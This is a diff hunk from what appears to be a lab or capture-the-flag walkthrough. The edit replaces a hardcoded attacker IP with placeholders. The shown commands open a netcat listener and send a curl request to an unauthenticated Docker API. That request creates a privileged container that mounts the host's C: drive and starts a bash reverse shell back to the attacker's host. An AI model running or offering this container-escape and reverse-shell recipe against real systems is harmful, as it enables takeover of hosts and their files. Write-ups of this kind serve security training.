@@ -160,7 +160,7 @@ nc -lvnp 4444 open listner
 # create higher privlaged docker that can read windows files
 
 ```
-curl -X POST "http://192.168.65.7:2375/v1.44/containers/create?name=pwn123" -H "Content-Type: application/json" -d '{"Image":"docker_setup-nginx-php:latest","Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.8/4444 0>&1"],"HostConfig":{"Binds":["/mnt/host/c:/host"],"Privileged":true},"Tty":true,"OpenStdin":true}' create the conatiner
+curl -X POST "http://192.168.65.7:2375/v1.44/containers/create?name=pwn123" -H "Content-Type: application/json" -d '{"Image":"docker_setup-nginx-php:latest","Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/YOUR_ATTACKER_IP/THE_LISTNER_PORT 0>&1"],"HostConfig":{"Binds":["/mnt/host/c:/host"],"Privileged":true},"Tty":true,"OpenStdin":true}' create the conatiner
 ```
 
 # run the contanier
